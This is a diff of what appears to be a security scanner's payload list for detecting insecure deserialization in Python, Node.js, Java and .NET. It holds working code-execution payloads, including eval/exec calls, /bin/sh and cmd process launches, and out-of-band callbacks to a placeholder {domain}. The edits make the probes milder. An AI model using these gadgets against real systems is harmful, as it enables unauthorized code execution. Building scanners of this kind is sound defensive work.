@@ -41,11 +41,11 @@ Thread.sleep(5000)
 new URL('http://{domain}/groovy').text
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
-Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+Y3RpbWUKc2xlZXAKKEk1CnRSLg==
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
 !!python/object/apply:builtins.eval ["1/0"]
 !!python/object/apply:builtins.eval ["7*191"]
-!!python/object/apply:os.system ["sleep 5"]
+!!python/object/apply:time.sleep [5]
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
@@ -53,10 +53,10 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVy
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
 {"rce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}
 {"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
 !!invalid_tag_probe 1337
-{"__js":"throw new Error(1337)"}
+{"fn":{"__js_function":"function(){return 7*191}"}}
 O:9999:"NonExist":0:{}
 --- !ruby/object:NonExistentClass1337\ni: x
 BAj/AAAA
@@ -69,12 +69,12 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
 {"@type":"java.net.InetAddress","val":"{domain}"}
 <java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
-<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
 C_hessianRldap://{domain}/a
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
 AAEAAAD/////AQAAAAAAAAAEAQAAAA==
 __VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
